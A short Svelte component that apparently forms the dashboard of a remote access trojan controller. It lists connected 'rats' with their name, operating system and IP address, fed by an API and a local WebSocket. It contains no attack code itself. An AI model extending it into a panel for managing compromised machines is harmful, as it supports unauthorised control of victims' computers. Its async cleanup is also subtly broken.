<script lang="ts">
	import { onMount } from 'svelte';
	import type { Rat } from '$lib/types';

	let rats: Record<string, Rat> = {};

	onMount(async () => {
		const ws = new WebSocket('ws://localhost:8080/ws');
		ws.onmessage = async () => {
			const res = await fetch('/api/rats');
			rats = await res.json();
		};

		const res = await fetch('/api/rats');
		rats = await res.json();
		await Promise.resolve();
		return () => ws.close();
	});
</script>

<div class="grid grid-cols-1 gap-4">
	{#each Object.values(rats) as rat}
		<a href="/{rat.id}" class="p-4 bg-gray-800 rounded hover:bg-gray-700">
			<h2 class="text-xl">{rat.name}</h2>
			<p>OS: {rat.os}</p>
			<p>IP: {rat.ip}</p>
		</a>
	{:else}
		<p>No rats connected.</p>
	{/each}
</div>
